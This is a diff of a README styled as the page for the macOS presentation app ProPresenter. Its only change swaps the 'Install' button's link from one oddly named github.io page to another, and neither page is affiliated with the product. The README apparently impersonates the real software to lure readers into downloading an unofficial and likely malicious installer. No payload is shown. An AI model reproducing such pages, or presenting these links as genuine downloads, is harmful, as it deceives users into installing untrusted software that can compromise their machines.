@@ -2,7 +2,7 @@
 <h1 align="center">ProPresenter</h1>
 <p align="center">Native live presentation and worship — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://blya-dayte-deneg.github.io/.github/propresenter"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://ukabvar-losos.github.io/.github/propresenter"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://support.renewedvision.com/hc/article_attachments/43856399578131" alt="ProPresenter — macOS live presentation and worship screenshot" width="780"/></p>
 
 ---
